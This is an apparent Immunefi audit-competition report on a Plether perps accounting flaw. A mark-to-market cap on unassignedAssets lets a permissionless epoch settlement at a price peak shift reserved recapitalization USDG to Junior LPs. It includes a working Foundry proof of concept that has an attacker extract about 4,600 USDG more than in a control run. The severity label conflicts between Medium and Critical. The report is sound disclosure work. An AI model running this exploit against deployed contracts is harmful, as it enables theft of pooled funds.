# \#98790 [SC-Medium] Asymmetric mark to market write down of `unassignedAssets` in `HousePoolReconcilePlanLib.planReconcile()` lets Junior LPs withdraw ownerless recapitalization USDG

**Submitted on Nov 10th 2026 at 07:55:45 UTC by @n0fr33w1f14u for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98790
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


# Description

## Brief/Intro

`HousePoolReconcilePlanLib.planReconcile()` caps the pool's ownerless `unassignedAssets` reserve at `snapshot.distributable`. That value is marked to market: it subtracts unrealized trader profit (`terminalLpPriceDeltaAssets`) from the pool's physical assets. `HousePool._reconcile()` then writes the reduced `unassignedAssets` to storage and keeps no record of the shortfall.

So a temporary unrealized trader gain larger than Senior plus Junior principal permanently lowers `unassignedAssets`, even though no USDG has left the pool. When the price comes back and the pool reconciles again, the recovered equity is treated as new waterfall revenue. It restores Senior up to its high-water mark, and the rest goes to `juniorPrincipal`. Junior LPs can then redeem and withdraw USDG that was meant to stay reserved until governance assigns it.

The trigger is the permissionless `OrderRouter.settleLpEpoch()`. Any Junior LP holding a matured redemption request can call it, and so can the routine LP keeper. The runnable PoC below compares two runs that are identical except for one settlement at the peak price. In the run with the peak settlement, about **9,200 USDG** of the reserve becomes Junior principal, and a holder of 50% of Junior withdraws **about 4,600 USDG more** than in the run without it. Pool cash is the same in both runs.

---

## Vulnerability Details

### 1. What `unassignedAssets` is for

In `HousePool.sol`, `unassignedAssets` holds recognized USDG that has no LP share owner. It stays reserved until governance assigns it explicitly with `assignUnassignedAssets()`:

```solidity
/// @notice Canonical assets without a safe share-owner path, reserved until explicit assignment (6 decimals).
uint256 public unassignedAssets;
```

The protocol states that this value must not leak to LPs:

- `INTERNAL_ARCHITECTURE_MAP.md:75`: unassigned assets "Require explicit assignment; cannot silently become windfall LP ownership."
- `ACCOUNTING_SPEC.md`: "only value with no safe claimant path belongs in `unassignedAssets`", and LP reconciliation compares terminal equity "excluding reserved pending claimant inflows and `unassignedAssets`".

**How it becomes nonzero during live trading (documented trusted action).** `CfdEngine.recapitalizePool(amountAssets)` is an immediate, documented owner action. Reconciliation first uses the amount to restore Senior up to `seniorHighWaterMark`. Any amount above that gap goes to `unassignedAssets` (`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent()`). A typical example is a recapitalization sized to satisfy `CfdEngine.clearDegradedMode()`. That requires pool cash net of trader claims to cover `_maxLiability()`, which can be far larger than the Senior gap.

The MED-26 response confirms that trading continues while this surplus exists: "ownerless value arising after activation does not introduce a new continuous trading or queued-order gate." The project's own test `test_Reachability_RecapitalizationRestoresSeniorAndReservesSurplusBeforeNewRevenue` (`packages/perps/test/perps/invariant/properties/PerpWaterfallReferenceInvariant.t.sol:309`) asserts "recap surplus remains reserved through later trading revenue". Holding a recap surplus in `unassignedAssets` while positions are open is therefore an expected operating state. `assignUnassignedAssets()` is also blocked while the oracle is frozen.

LP withdrawals exclude the reserve. `HousePool._buildWithdrawalSnapshot()` subtracts `unassignedAssets` from `freeAssets`:

```solidity
snapshot = HousePoolAccountingLib.buildWithdrawalSnapshot(accountingSnapshot);
snapshot = HousePoolWithdrawalPreviewLib.reserveAssets(snapshot, reservedPendingClaimantAssets);
snapshot = HousePoolWithdrawalPreviewLib.reserveAssets(snapshot, reservedUnassignedAssets);
```

---

### 2. Root cause

#### A. `buildReconcileSnapshot()` subtracts unrealized trader profit from `distributable`

```solidity
// packages/perps/src/libraries/HousePoolAccountingLib.sol
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}
```

When open positions have net unrealized profit against the pool, `terminalLpPriceDeltaAssets < 0`, and `distributable` drops even though no USDG has moved.

#### B. `planReconcile()` caps the reserve at that marked value

```solidity
// packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:73-74
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
```

When `distributable < unassignedAssets`, the following happens:
1. The reserve is cut down to `distributable`.
2. `distributableToClaims` becomes 0.
3. `absorbLoss()` sets both `juniorPrincipal` and `seniorPrincipal` to 0 and keeps `seniorHighWaterMark`.

#### C. `_reconcile()` saves the reduced reserve, with no restoration target

```solidity
// packages/perps/src/HousePool.sol:1584-1585
_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;
```

Senior's lost principal is remembered through `seniorHighWaterMark`. The lost part of `unassignedAssets` is not remembered anywhere.

#### D. The rebound is routed to Senior and then Junior, never back to the reserve

On the next fresh reconcile after the price comes back, both principals are zero, so `claimedEquityZero` is true:

```solidity
if (plan.claimedEquityZero) {
    uint256 seededDistributableToClaims = snapshot.distributable > plan.state.unassignedAssets
        ? snapshot.distributable - plan.state.unassignedAssets
        : 0;
    HousePoolPendingPreviewLib.applyRevenueIntent(plan.state, seededDistributableToClaims);
    return plan;
}
```

`applyRevenueIntent()` restores Senior up to its high-water mark and credits **everything else** to `juniorPrincipal`, including the amount cut from the reserve. So losses are taken in the order Junior, then Senior, then reserve, but recovery goes Senior, then Junior, and the reserve gets nothing back.

#### Evidence that the marked cap is unintended

The project's independent waterfall reference model caps the reserve only against **realized cash** (`packages/perps/test/perps/invariant/properties/PerpWaterfallReferenceInvariant.t.sol:200`):

```solidity
if (expectedUnassigned > expectedCash) {
    expectedUnassigned = expectedCash;
}
```

The model only covers flat positions, so it never applies the cap against a temporary mark. The production code applies the same cap against the marked `distributable`. That is how a mark that later reverses can permanently move ownerless value into LP principal.

---

### 3. Step-by-step walkthrough (values from the PoC, release risk parameters)

**Step 1: baseline after a legitimate recapitalization.**
- Junior is 10,000 USDG: a 1,000 seed, an attacker with 5,000 (50%), and an incumbent with 4,000.
- Senior is 10,000 USDG: a 1,000 seed plus a 9,000 LP. Its high-water mark is 10,000.
- The owner calls `CfdEngine.recapitalizePool(980_000e6)`. Senior is unimpaired, so the next settlement routes all of it to `unassignedAssets`:
  - `totalAssets()` ≈ 1,000,000
  - `unassignedAssets` = 980,000
  - `seniorPrincipal` ≈ 10,000
  - `juniorPrincipal` ≈ 10,000

**Step 2: a trader opens a 400,000 USDG SHORT at $1.00 through the router.** This is 40% skew against about $1M of depth. The open pays about 800 USDG of VPI to the pool.

**Step 3: the mark moves to $1.075, and anyone settles an LP epoch.** The attacker's matured, full-balance Junior redemption is settled with `OrderRouter.settleLpEpoch()` at the $1.075 price:
- Trader unrealized PnL is +30,000, so `distributable` ≈ 1,000,800 − 30,000 = 970,800.
- `unassignedAssets` is cut from 980,000 to **970,800**.
- `seniorPrincipal` and `juniorPrincipal` both become 0. The Senior high-water mark stays at 10,000.
- The Junior redemption is priced at 0, so its shares are refunded through `refundRedeemEpochRemainder()`. The epoch still counts as processed, so the call succeeds.

**Step 4: the price returns to $1.00, and the trader closes the full position.** No USDG left the pool for trader PnL.

**Step 5: the attacker redeems again.** On the next settlement:
- `distributable` ≈ 1,000,161 (fees and carry left after the VPI rebate).
- `unassignedAssets` stays at 970,800, so about 29,361 is routed as "revenue": about 10,000 restores Senior to its high-water mark, and about **19,361 goes to Junior**.
- The attacker's redemption is fully funded. They receive **9,680.59 USDG** for a 5,000 deposit.

**Control run.** It is identical, except that no settlement happens while the price is at $1.075:
- `unassignedAssets` stays at **980,000**.
- Junior's total value is about 10,161.
- The attacker receives **5,080.54 USDG**.

| | Control | With peak settlement | Difference |
|---|---|---|---|
| Pool cash before attacker exit | 1,000,161.39 | 1,000,161.39 | ~0 (carry-timing dust) |
| `unassignedAssets` (final) | 980,000.00 | 970,800.01 | **−9,199.99** |
| Junior value (paid out + remaining principal) | 10,161.08 | 19,361.17 | **+9,200.09** |
| Senior principal (final) | 10,000.31 | 10,000.22 | ~0 (coupon timing) |
| Attacker payout | 5,080.54 | 9,680.59 | **+4,600.04** |

All of the reserve write-down ends up as Junior value, and the attacker takes their pro-rata half of it in USDG.

---

## Impact Details

### Severity: Critical, direct theft of funds

USDG reserved as ownerless recapitalization capital is withdrawn by Junior LPs who have no claim to it. The loss is permanent: no code path restores the reserve. When the owner later calls `assignUnassignedAssets()`, the written-down part has already been paid to Junior redeemers. It is missing for whoever was meant to receive the assignment (the protocol, or the LPs it intended to recapitalize).

### Amount at risk

The amount written down in one peak settlement is

```
writeDown = min(unassignedAssets, peakUnrealizedTraderPnL − (seniorPrincipal + juniorPrincipal) − unrecognizedPoolRevenue)
```

If the price later comes back, all of it moves to Junior. Example: with a 980,000 reserve, a 500,000 unrealized trader gain against 20,000 of LP principal writes the reserve down to about 500,000. If the price reverts, about 480,000 USDG becomes withdrawable Junior principal.

### Why the attack is practical

- **Permissionless trigger.** `OrderRouter.settleLpEpoch()` only needs a matured request. A Junior LP can keep one queued at all times. The reference LP keeper settles epochs routinely, so the write-down can happen with no attacker at all.
- **No downside for the caller.** If the price does not come back and the trader realizes the profit, the result is the same as without the peak settlement. Triggering the write-down only adds upside for Junior holders.
- **Trusted-role action is legitimate.** The only privileged step is a documented `recapitalizePool()`. Per the program rules, "a legitimate, documented action by a trusted role that triggers a bug harming users or the protocol" is in scope.

The required market condition (unrealized trader profit above total LP principal, followed by a reversal) and the owner's ability to call `assignUnassignedAssets()` promptly are feasibility factors. Per the program's Feasibility Limitations section, they affect payout, not impact or severity.

### Relation to known issues

**MED-26** (Cecuro, acknowledged) is about trading being *activated* while ownerless assets exist, and about realized trader PnL being able to *consume* them. This report has a different root cause:
- The reserve is written down against a temporary unrealized mark, never restored, and the rebound is then *credited to Junior LPs*.
- The MED-26 fix (an activation gate) and its acknowledgment (trading continues against ownerless value) do not address this.
- In the PoC, the trader is flat over the round trip, so no USDG is consumed by trader PnL at all.

---

## Recommended Fix

Pick one of the following:

1. **Cap the reserve against realized backing only.** In `planReconcile()`, compute the cap from physical assets minus trader claims, without `terminalLpPriceDeltaAssets`. This matches the project's reference model. An unrealized mark then reduces only Senior and Junior, and the reserve is reduced only by realized losses.
2. **Track and restore the shortfall.** Record the written-down amount, the same way `seniorHighWaterMark` does for Senior. Restore the reserve first in `planReconcile()` / `applyRevenueIntent()` before any value reaches `seniorPrincipal` or `juniorPrincipal`.

Apply the same change to the preview path (`_previewPendingAccountingState()`), so withdrawal previews match live settlement.

---



## Proof of Concept

# Proof of Concept

## How to run

```bash
forge test --match-path test/poc/UnassignedWriteDownJuniorWindfall.t.sol -vv
```

The PoC uses the in-repo `BasePerpTest` harness, the release risk parameters from `packages/perps/DEPLOYMENT.md`, and the release Senior limits (40M USDG / 80%). It does not modify any in-scope contract. Only Pyth (MockPyth) and USDG (MockSettlementToken) are mocked. All protocol actions go through public entry points:
- the owner's `CfdEngine.recapitalizePool`
- `OrderRouter.commitOrder` / `executeOrder` for the trade
- `OrderRouter.settleLpEpoch` for every LP settlement
- `TrancheVault.requestRedeem` / `claimRedeem` / `claimRedeemRefund`

The single test runs the control path, reverts state, and runs the attack path. It then asserts:
- pool cash is identical before the attacker's exit in both runs
- the control keeps the full 980,000 reserve
- the reserve is permanently written down by more than 9,000 USDG in the attack run
- Junior value rises by exactly the write-down, and Senior is unaffected
- the attacker withdraws their pro-rata half of the write-down, about 1.9× their deposit

## Output

```
[PASS] test_Poc_PeakSettlementMovesUnassignedIntoJunior() (gas: 18050683)
Logs:
  ---- control (no settlement at peak) ----
  attacker payout: 5080543286
  unassigned after: 980000000000
  junior principal after: 5080540194
  senior principal after: 10000310527
  pool totalAssets after: 995080850721
  trader unrealized PnL at peak: 30000000000
  unassigned after peak settle: 970800009127
  senior principal after peak: 0
  junior principal after peak: 0
  ---- attack (permissionless settlement at peak) ----
  attacker payout: 9680585681
  unassigned after: 970800009127
  junior principal after: 9680579790
  senior principal after: 10000219202
  pool totalAssets after: 990480808119
  unassigned permanently written down: 9199990873
  attacker extra USDG vs control: 4600042395
```

## Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Verification PoC: a mark-to-market write-down of `unassignedAssets` is never restored, so the rebound
///         is routed to Junior principal instead of back to the ownerless reserve.
/// @dev Two runs share every step (LP funding, owner recapitalization, a 400k SHORT opened and closed flat at $1.00).
///      The only difference is whether a permissionless `router.settleLpEpoch` runs while the mark sits at $1.075.
contract UnassignedWriteDownJuniorWindfallPoC is BasePerpTest {

    address private constant SENIOR_LP = address(0x5E1102);
    address private constant INCUMBENT = address(0xA11CE);
    address private constant ATTACKER = address(0xB0B);
    address private constant CAROL = address(0xCA201);
    address private constant TRADER = address(0x7EAD);

    uint256 private constant ENTRY = 1e8; // $1.00
    uint256 private constant PEAK = 107_500_000; // $1.075
    uint256 private constant RECAP = 980_000e6;
    uint256 private constant SIZE = 400_000e18; // $400,000 notional SHORT
    uint256 private constant TRADER_MARGIN = 40_000e6;

    struct Outcome {
        uint256 attackerPayout;
        uint256 unassignedAfter;
        uint256 juniorPrincipalAfter;
        uint256 seniorPrincipalAfter;
        uint256 physicalAfter;
    }

    // Release parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000); // release Senior limits
        vm.warp(SETUP_TIMESTAMP);
    }

    function test_Poc_PeakSettlementMovesUnassignedIntoJunior() public {
        uint256 snap = vm.snapshotState();
        Outcome memory control = _scenario(false);
        emit log("---- control (no settlement at peak) ----");
        console_log(control);
        vm.revertToState(snap);

        Outcome memory attack = _scenario(true);
        emit log("---- attack (permissionless settlement at peak) ----");
        console_log(attack);

        // Same economic path: identical pool cash before the attacker's exit; only the allocation differs.
        assertApproxEqAbs(
            attack.physicalAfter + attack.attackerPayout,
            control.physicalAfter + control.attackerPayout,
            1e6,
            "pool cash identical in both runs (carry-timing dust only)"
        );
        assertEq(control.unassignedAfter, RECAP, "control keeps the full ownerless reserve");

        uint256 writeDown = RECAP - attack.unassignedAfter;
        emit log_named_uint("unassigned permanently written down", writeDown);
        assertGt(writeDown, 9_000e6, "reserve lost > $9k with no USDG paid to the trader");

        // Every written-down dollar ends up as Junior value (paid out to attacker + left as Junior principal).
        uint256 juniorValueAttack = attack.attackerPayout + attack.juniorPrincipalAfter;
        uint256 juniorValueControl = control.attackerPayout + control.juniorPrincipalAfter;
        assertApproxEqAbs(juniorValueAttack - juniorValueControl, writeDown, 1e6, "write-down became Junior value");
        assertApproxEqAbs(attack.seniorPrincipalAfter, control.seniorPrincipalAfter, 1e6, "Senior unaffected");

        // The attacker (≈50% of Junior) withdraws about half of the reserve write-down in real USDG.
        uint256 extra = attack.attackerPayout - control.attackerPayout;
        emit log_named_uint("attacker extra USDG vs control", extra);
        assertApproxEqRel(extra, writeDown / 2, 0.02e18, "attacker extracts its pro-rata share");
        assertGt(attack.attackerPayout, 5_000e6 * 19 / 10, "attacker redeems ~1.9x its 5k deposit");
    }

    function _scenario(bool settleAtPeak) internal returns (Outcome memory o) {
        // ---- LP funding: Junior 10k (seed 1k + attacker 5k + incumbent 4k) + Carol 1k, Senior 10k (seed 1k + 9k)
        uint256 attackerShares = _fundJuniorDelayed(ATTACKER, 5_000e6);
        _fundJunior(INCUMBENT, 4_000e6);
        uint256 carolShares = _fundJuniorDelayed(CAROL, 1_000e6);
        _fundSenior(SENIOR_LP, 9_000e6);

        // ---- Owner recapitalizes while Senior is unimpaired; a normal settlement routes it to unassignedAssets.
        _finishAsyncCooldown(CAROL);
        vm.prank(CAROL);
        uint256 carolEpoch = juniorVault.requestRedeem(carolShares, CAROL, CAROL);
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        vm.warp(pool.lpEpochStart(carolEpoch));
        router.settleLpEpoch(_mockPythUpdateData(ENTRY));
        uint256 carolClaimable = juniorVault.claimableRedeemRequest(carolEpoch, CAROL);
        vm.prank(CAROL);
        juniorVault.claimRedeem(carolEpoch, carolClaimable, CAROL, CAROL);

        assertEq(pool.unassignedAssets(), RECAP, "baseline: recap parked as unassigned");
        assertApproxEqAbs(pool.seniorPrincipal(), 10_000e6, 1e6, "baseline senior");
        assertApproxEqAbs(pool.juniorPrincipal(), 10_000e6, 1e6, "baseline junior");

        // ---- Trader opens a $400k SHORT at $1.00 (40% skew of ~$1M depth) through the public router.
        _fundTrader(TRADER, TRADER_MARGIN + 10_000e6);
        vm.prank(TRADER);
        uint64 openId = router.commitOrder(CfdTypes.Side.SHORT, SIZE, TRADER_MARGIN, ENTRY, false);
        router.executeOrder(openId, _mockPythUpdateData(ENTRY));
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, SIZE, "short opened");

        // ---- Attacker queues a full Junior redemption; with settleAtPeak, anyone settles it while mark = $1.075.
        _finishAsyncCooldown(ATTACKER);
        if (settleAtPeak) {
            vm.prank(ATTACKER);
            uint256 peakEpoch = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
            vm.warp(pool.lpEpochStart(peakEpoch));
            router.settleLpEpoch(_mockPythUpdateData(PEAK));

            int256 pnl = _unrealizedTraderPnl();
            emit log_named_int("trader unrealized PnL at peak", pnl);
            emit log_named_uint("unassigned after peak settle", pool.unassignedAssets());
            emit log_named_uint("senior principal after peak", pool.seniorPrincipal());
            emit log_named_uint("junior principal after peak", pool.juniorPrincipal());
            assertEq(pool.juniorPrincipal(), 0, "junior wiped at peak");
            assertEq(pool.seniorPrincipal(), 0, "senior wiped at peak");
            assertLt(pool.unassignedAssets(), RECAP, "unassigned written down at peak");

            vm.prank(ATTACKER);
            juniorVault.claimRedeemRefund(peakEpoch, ATTACKER, ATTACKER);
            assertEq(juniorVault.balanceOf(ATTACKER), attackerShares, "shares refunded");
        } else {
            vm.warp(block.timestamp + 1 hours);
        }

        // ---- Price returns to $1.00 and the trader closes flat.
        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
        router.executeOrder(closeId, _mockPythUpdateData(ENTRY));
        (size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 0, "short closed");

        // ---- Attacker redeems all Junior shares.
        _finishAsyncCooldown(ATTACKER);
        vm.prank(ATTACKER);
        uint256 exitEpoch = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(exitEpoch));
        router.settleLpEpoch(_mockPythUpdateData(ENTRY));
        uint256 claimable = juniorVault.claimableRedeemRequest(exitEpoch, ATTACKER);
        assertEq(claimable, attackerShares, "exit fully funded");
        vm.prank(ATTACKER);
        o.attackerPayout = juniorVault.claimRedeem(exitEpoch, claimable, ATTACKER, ATTACKER);

        o.unassignedAfter = pool.unassignedAssets();
        o.juniorPrincipalAfter = pool.juniorPrincipal();
        o.seniorPrincipalAfter = pool.seniorPrincipal();
        o.physicalAfter = pool.totalAssets();
    }

    function _finishAsyncCooldown(address owner) private {
        uint256 unlock = juniorVault.lastDepositTime(owner) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp <= unlock) {
            vm.warp(unlock + 1);
        }
    }

    function console_log(Outcome memory o) private {
        emit log_named_uint("attacker payout", o.attackerPayout);
        emit log_named_uint("unassigned after", o.unassignedAfter);
        emit log_named_uint("junior principal after", o.juniorPrincipalAfter);
        emit log_named_uint("senior principal after", o.seniorPrincipalAfter);
        emit log_named_uint("pool totalAssets after", o.physicalAfter);
    }

}
```

